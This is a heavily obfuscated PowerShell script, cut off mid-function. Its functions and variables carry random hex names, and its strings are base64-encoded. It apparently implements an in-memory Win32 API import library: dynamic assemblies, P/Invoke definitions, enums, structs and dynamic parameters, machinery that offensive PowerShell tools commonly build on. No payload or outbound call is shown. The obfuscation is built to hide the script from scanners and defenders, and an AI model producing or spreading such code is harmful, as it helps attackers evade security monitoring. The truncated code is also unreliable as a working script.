
function dfa212a664ef40ed9a4d3f737ea1319a {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${a79b7b0fe03d49c4964d9c78ceedfc48} = [Guid]::NewGuid().ToString()
    )
    ${c42d66dabf144c4b8569ab0ed9b03d6e} = [Reflection.Assembly].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    ${cf949d9ab0d0420899d6f9a6d34c3239} = ${c42d66dabf144c4b8569ab0ed9b03d6e}.GetAssemblies()
    foreach (${03a2d67a80224d88b1f8e3f593bfe67d} in ${cf949d9ab0d0420899d6f9a6d34c3239}) {
        if (${03a2d67a80224d88b1f8e3f593bfe67d}.FullName -and (${03a2d67a80224d88b1f8e3f593bfe67d}.FullName.Split(',')[0] -eq ${a79b7b0fe03d49c4964d9c78ceedfc48})) {
            return ${03a2d67a80224d88b1f8e3f593bfe67d}
        }
    }
    ${1d7732aa71444345bfe31e1f79ff0b22} = New-Object Reflection.AssemblyName(${a79b7b0fe03d49c4964d9c78ceedfc48})
    $Domain = ${c42d66dabf144c4b8569ab0ed9b03d6e}
    ${69fe7d1c63a3480fbbc5331fe9e3041c} = $Domain.DefineDynamicAssembly(${1d7732aa71444345bfe31e1f79ff0b22}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${66b519baa43c447990c47c0b23f3d581} = ${69fe7d1c63a3480fbbc5331fe9e3041c}.DefineDynamicModule(${a79b7b0fe03d49c4964d9c78ceedfc48}, $False)
    return ${66b519baa43c447990c47c0b23f3d581}
}
function b4aa4392be8940b59c2306d96115e757 {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${c2524030dc1943bfb9cc498fc547b434},
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        ${a7aea058bb29418992331e861626a985},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${bab6f4e18a98403dafecf7c5726d194b},
        [Parameter(Position = 3)]
        [Type[]]
        ${d2bf0f7de4a34d1c8827c9dca6e62a13},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${d5562daf79ce4349bc46a6441df701a2},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${c6263d1cecda4830970d16b03bc15f9a},
        [String]
        ${b31be7ad219e474ba4dcbfd4c5237232},
        [Switch]
        ${c0294ad1afee4a2586e4daaa1497fbcf}
    )
    $Properties = @{
        DllName = ${c2524030dc1943bfb9cc498fc547b434}
        FunctionName = ${a7aea058bb29418992331e861626a985}
        ReturnType = ${bab6f4e18a98403dafecf7c5726d194b}
    }
    if (${d2bf0f7de4a34d1c8827c9dca6e62a13}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${d2bf0f7de4a34d1c8827c9dca6e62a13} }
    if (${d5562daf79ce4349bc46a6441df701a2}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${d5562daf79ce4349bc46a6441df701a2} }
    if (${c6263d1cecda4830970d16b03bc15f9a}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${c6263d1cecda4830970d16b03bc15f9a} }
    if (${c0294ad1afee4a2586e4daaa1497fbcf}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${c0294ad1afee4a2586e4daaa1497fbcf} }
    if (${b31be7ad219e474ba4dcbfd4c5237232}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = ${b31be7ad219e474ba4dcbfd4c5237232} }
    New-Object PSObject -Property $Properties
}
function a211b3c58a89403e93b3d492ab11ff65
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${c2524030dc1943bfb9cc498fc547b434},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${a7aea058bb29418992331e861626a985},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        ${b31be7ad219e474ba4dcbfd4c5237232},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        ${bab6f4e18a98403dafecf7c5726d194b},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        ${d2bf0f7de4a34d1c8827c9dca6e62a13},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        ${d5562daf79ce4349bc46a6441df701a2} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        ${c6263d1cecda4830970d16b03bc15f9a} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        ${c0294ad1afee4a2586e4daaa1497fbcf},
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90},
        [ValidateNotNull()]
        [String]
        ${c60ba45ebe9d4acd800c60abf2d83c04} = ''
    )
    BEGIN
    {
        ${67ec5d365f3544e59849db4132a536b8} = @{}
    }
    PROCESS
    {
        if (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90} -is [Reflection.Assembly])
        {
            if (${c60ba45ebe9d4acd800c60abf2d83c04})
            {
                ${67ec5d365f3544e59849db4132a536b8}[${c2524030dc1943bfb9cc498fc547b434}] = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANgAwAGIAYQA0ADUAZQBiAGUAOQBkADQAYQBjAGQAOAAwADAAYwA2ADAAYQBiAGYAMgBkADgAMwBjADAANAB9AC4AJAB7AGMAMgA1ADIANAAwADMAMABkAGMAMQA5ADQAMwBiAGYAYgA5AGMAYwA0ADkAOABmAGMANQA0ADcAYgA0ADMANAB9AA=='))))
            }
            else
            {
                ${67ec5d365f3544e59849db4132a536b8}[${c2524030dc1943bfb9cc498fc547b434}] = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.GetType(${c2524030dc1943bfb9cc498fc547b434})
            }
        }
        else
        {
            if (!${67ec5d365f3544e59849db4132a536b8}.ContainsKey(${c2524030dc1943bfb9cc498fc547b434}))
            {
                if (${c60ba45ebe9d4acd800c60abf2d83c04})
                {
                    ${67ec5d365f3544e59849db4132a536b8}[${c2524030dc1943bfb9cc498fc547b434}] = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANgAwAGIAYQA0ADUAZQBiAGUAOQBkADQAYQBjAGQAOAAwADAAYwA2ADAAYQBiAGYAMgBkADgAMwBjADAANAB9AC4AJAB7AGMAMgA1ADIANAAwADMAMABkAGMAMQA5ADQAMwBiAGYAYgA5AGMAYwA0ADkAOABmAGMANQA0ADcAYgA0ADMANAB9AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${67ec5d365f3544e59849db4132a536b8}[${c2524030dc1943bfb9cc498fc547b434}] = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.DefineType(${c2524030dc1943bfb9cc498fc547b434}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = ${67ec5d365f3544e59849db4132a536b8}[${c2524030dc1943bfb9cc498fc547b434}].DefineMethod(
                ${a7aea058bb29418992331e861626a985},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${bab6f4e18a98403dafecf7c5726d194b},
                ${d2bf0f7de4a34d1c8827c9dca6e62a13})
            ${35c58f1556d947ac8053e2f546574b9e} = 1
            foreach(${91869323bc2b4dd88b0d3083dac350ce} in ${d2bf0f7de4a34d1c8827c9dca6e62a13})
            {
                if (${91869323bc2b4dd88b0d3083dac350ce}.IsByRef)
                {
                    [void] $Method.DefineParameter(${35c58f1556d947ac8053e2f546574b9e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                }
                ${35c58f1556d947ac8053e2f546574b9e}++
            }
            ${7793dceebbef4c338da2d5f6a0978faf} = [Runtime.InteropServices.DllImportAttribute]
            ${f188b037b1d240078c896a5315f84e73} = ${7793dceebbef4c338da2d5f6a0978faf}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${dabc2de939b24482961cd1a69d5dd7f6} = ${7793dceebbef4c338da2d5f6a0978faf}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${d9c0879713e648bf93ed6e2406349aae} = ${7793dceebbef4c338da2d5f6a0978faf}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            ${13317e75e73d4213ad555a5280ae95e3} = ${7793dceebbef4c338da2d5f6a0978faf}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if (${c0294ad1afee4a2586e4daaa1497fbcf}) { ${26ccd92da7bd4e398b7108c787934df6} = $True } else { ${26ccd92da7bd4e398b7108c787934df6} = $False }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { ${c45c63d2430745cf9d3ebc4940ec0335} = ${b31be7ad219e474ba4dcbfd4c5237232} } else { ${c45c63d2430745cf9d3ebc4940ec0335} = ${a7aea058bb29418992331e861626a985} }
            ${aa7e647efe1e4d92b0f841859fa35526} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${8b719205075140f6bf95f938483b23bc} = New-Object Reflection.Emit.CustomAttributeBuilder(${aa7e647efe1e4d92b0f841859fa35526},
                ${c2524030dc1943bfb9cc498fc547b434}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${f188b037b1d240078c896a5315f84e73},
                                           ${dabc2de939b24482961cd1a69d5dd7f6},
                                           ${d9c0879713e648bf93ed6e2406349aae},
                                           ${13317e75e73d4213ad555a5280ae95e3}),
                [Object[]] @(${26ccd92da7bd4e398b7108c787934df6},
                             ([Runtime.InteropServices.CallingConvention] ${d5562daf79ce4349bc46a6441df701a2}),
                             ([Runtime.InteropServices.CharSet] ${c6263d1cecda4830970d16b03bc15f9a}),
                             ${c45c63d2430745cf9d3ebc4940ec0335}))
            $Method.SetCustomAttribute(${8b719205075140f6bf95f938483b23bc})
        }
    }
    END
    {
        if (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90} -is [Reflection.Assembly])
        {
            return ${67ec5d365f3544e59849db4132a536b8}
        }
        ${db9f7ba056bc4599a867d5b366436aae} = @{}
        foreach (${ce081e5a91d149619816a7bc035e290e} in ${67ec5d365f3544e59849db4132a536b8}.Keys)
        {
            ${c8f42b8a5203479ba051f687fab516f8} = ${67ec5d365f3544e59849db4132a536b8}[${ce081e5a91d149619816a7bc035e290e}].CreateType()
            ${db9f7ba056bc4599a867d5b366436aae}[${ce081e5a91d149619816a7bc035e290e}] = ${c8f42b8a5203479ba051f687fab516f8}
        }
        return ${db9f7ba056bc4599a867d5b366436aae}
    }
}
function bec1d6df361147498089ffb19fe424f1 {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90},
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${a656e1969dff43e7bd1b77c1f6e35a72},
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        ${c8f42b8a5203479ba051f687fab516f8},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${de84dde7338c40cba2aa8fb43bd41bf8},
        [Switch]
        ${cf9dfce8ea264afa997fad3ee29f75b0}
    )
    if (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90} -is [Reflection.Assembly])
    {
        return (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.GetType(${a656e1969dff43e7bd1b77c1f6e35a72}))
    }
    ${073eeebe1b3b4de6b7464b90484b6052} = ${c8f42b8a5203479ba051f687fab516f8} -as [Type]
    ${c46bfc6cbd544a17826c357bc1f7a442} = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.DefineEnum(${a656e1969dff43e7bd1b77c1f6e35a72}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${073eeebe1b3b4de6b7464b90484b6052})
    if (${cf9dfce8ea264afa997fad3ee29f75b0})
    {
        ${3abf6a93737f46d8bf3bafc1f522c962} = [FlagsAttribute].GetConstructor(@())
        ${640a6b457b8e415b9e052d228d3a0eaf} = New-Object Reflection.Emit.CustomAttributeBuilder(${3abf6a93737f46d8bf3bafc1f522c962}, @())
        ${c46bfc6cbd544a17826c357bc1f7a442}.SetCustomAttribute(${640a6b457b8e415b9e052d228d3a0eaf})
    }
    foreach (${ce081e5a91d149619816a7bc035e290e} in ${de84dde7338c40cba2aa8fb43bd41bf8}.Keys)
    {
        $null = ${c46bfc6cbd544a17826c357bc1f7a442}.DefineLiteral(${ce081e5a91d149619816a7bc035e290e}, ${de84dde7338c40cba2aa8fb43bd41bf8}[${ce081e5a91d149619816a7bc035e290e}] -as ${073eeebe1b3b4de6b7464b90484b6052})
    }
    ${c46bfc6cbd544a17826c357bc1f7a442}.CreateType()
}
function c3139b5db4b64607aa09334cd92daeb1 {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        ${e58b466f9a2545edb06cbba271673dbc},
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        ${c8f42b8a5203479ba051f687fab516f8},
        [Parameter(Position = 2)]
        [UInt16]
        ${b80d9562f792404db0205d365e956f5e},
        [Object[]]
        ${bbef160c684049c4bfa1046431e8b186}
    )
    @{
        Position = ${e58b466f9a2545edb06cbba271673dbc}
        Type = ${c8f42b8a5203479ba051f687fab516f8} -as [Type]
        Offset = ${b80d9562f792404db0205d365e956f5e}
        MarshalAs = ${bbef160c684049c4bfa1046431e8b186}
    }
}
function d15bce5efdc644aeb61c61b619e06627
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90},
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${a656e1969dff43e7bd1b77c1f6e35a72},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${c247fd9de6d446a7884520f4b1d71bcc},
        [Reflection.Emit.PackingSize]
        ${d53ce64ccf1545268cdf00b7dc229d55} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${cab19d1b5a1245ada9717db98c82abe4}
    )
    if (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90} -is [Reflection.Assembly])
    {
        return (${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.GetType(${a656e1969dff43e7bd1b77c1f6e35a72}))
    }
    [Reflection.TypeAttributes] ${a6066b894a9e4dc4a129a7fdb997cbcd} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if (${cab19d1b5a1245ada9717db98c82abe4})
    {
        ${a6066b894a9e4dc4a129a7fdb997cbcd} = ${a6066b894a9e4dc4a129a7fdb997cbcd} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${a6066b894a9e4dc4a129a7fdb997cbcd} = ${a6066b894a9e4dc4a129a7fdb997cbcd} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${12673034c3434e4ea4dea7ac5778df28} = ${d7dbf3b1fe6a4a52a65cdbdd80fc7a90}.DefineType(${a656e1969dff43e7bd1b77c1f6e35a72}, ${a6066b894a9e4dc4a129a7fdb997cbcd}, [ValueType], ${d53ce64ccf1545268cdf00b7dc229d55})
    ${2af5646353f243aa9a139e8e3c09b9bd} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${74d843e791f44d7189bdcc75298c31ea} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${6b77b049d40342eeada661e17785f05d} = New-Object Hashtable[](${c247fd9de6d446a7884520f4b1d71bcc}.Count)
    foreach (${7f2fe1c62dfd4878a6f4de340b0300cf} in ${c247fd9de6d446a7884520f4b1d71bcc}.Keys)
    {
        ${a7af3c04c4164e3e9167fabd4c7e44fd} = ${c247fd9de6d446a7884520f4b1d71bcc}[${7f2fe1c62dfd4878a6f4de340b0300cf}][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${6b77b049d40342eeada661e17785f05d}[${a7af3c04c4164e3e9167fabd4c7e44fd}] = @{FieldName = ${7f2fe1c62dfd4878a6f4de340b0300cf}; Properties = ${c247fd9de6d446a7884520f4b1d71bcc}[${7f2fe1c62dfd4878a6f4de340b0300cf}]}
    }
    foreach (${7f2fe1c62dfd4878a6f4de340b0300cf} in ${6b77b049d40342eeada661e17785f05d})
    {
        ${57f08f54cab748a7a43f126d34fde0c8} = ${7f2fe1c62dfd4878a6f4de340b0300cf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${ed7c4d52b135480eb55f7255cf1f2362} = ${7f2fe1c62dfd4878a6f4de340b0300cf}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${b80d9562f792404db0205d365e956f5e} = ${ed7c4d52b135480eb55f7255cf1f2362}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${c8f42b8a5203479ba051f687fab516f8} = ${ed7c4d52b135480eb55f7255cf1f2362}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${bbef160c684049c4bfa1046431e8b186} = ${ed7c4d52b135480eb55f7255cf1f2362}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${8b13d065e9d845d19c4d287bff0f51e0} = ${12673034c3434e4ea4dea7ac5778df28}.DefineField(${57f08f54cab748a7a43f126d34fde0c8}, ${c8f42b8a5203479ba051f687fab516f8}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${bbef160c684049c4bfa1046431e8b186})
        {
            ${a9bdbc0c13024583a554329b47c99760} = ${bbef160c684049c4bfa1046431e8b186}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${bbef160c684049c4bfa1046431e8b186}[1])
            {
                ${dd0d0bd49cf74665bf8f109f2831fd50} = ${bbef160c684049c4bfa1046431e8b186}[1]
                ${f6a9fe6ecf70413f8e1b284c120d6e0d} = New-Object Reflection.Emit.CustomAttributeBuilder(${2af5646353f243aa9a139e8e3c09b9bd},
                    ${a9bdbc0c13024583a554329b47c99760}, ${74d843e791f44d7189bdcc75298c31ea}, @(${dd0d0bd49cf74665bf8f109f2831fd50}))
            }
            else
            {
                ${f6a9fe6ecf70413f8e1b284c120d6e0d} = New-Object Reflection.Emit.CustomAttributeBuilder(${2af5646353f243aa9a139e8e3c09b9bd}, [Object[]] @(${a9bdbc0c13024583a554329b47c99760}))
            }
            ${8b13d065e9d845d19c4d287bff0f51e0}.SetCustomAttribute(${f6a9fe6ecf70413f8e1b284c120d6e0d})
        }
        if (${cab19d1b5a1245ada9717db98c82abe4}) { ${8b13d065e9d845d19c4d287bff0f51e0}.SetOffset(${b80d9562f792404db0205d365e956f5e}) }
    }
    ${947340fb737b4bf3b101d1f742465a25} = ${12673034c3434e4ea4dea7ac5778df28}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${88ba1b10aceb4994ae4448d3d2a187fd} = ${947340fb737b4bf3b101d1f742465a25}.GetILGenerator()
    ${88ba1b10aceb4994ae4448d3d2a187fd}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${12673034c3434e4ea4dea7ac5778df28})
    ${88ba1b10aceb4994ae4448d3d2a187fd}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${88ba1b10aceb4994ae4448d3d2a187fd}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${88ba1b10aceb4994ae4448d3d2a187fd}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${86900a873bb34a478039c60cb1fadd32} = ${12673034c3434e4ea4dea7ac5778df28}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${12673034c3434e4ea4dea7ac5778df28},
        [Type[]] @([IntPtr]))
    ${44e49c3307eb4703a141a9469f855d8f} = ${86900a873bb34a478039c60cb1fadd32}.GetILGenerator()
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${12673034c3434e4ea4dea7ac5778df28})
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${12673034c3434e4ea4dea7ac5778df28})
    ${44e49c3307eb4703a141a9469f855d8f}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${12673034c3434e4ea4dea7ac5778df28}.CreateType()
}
Function bef71dfb45ba46c1b577a61e7f67f221 {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]${c8f42b8a5203479ba051f687fab516f8} = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]${238a7d0fdce049419c6561aa7b5737ff},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]${e58b466f9a2545edb06cbba271673dbc},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFIAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYwB0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            $true
        })]
        $Dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
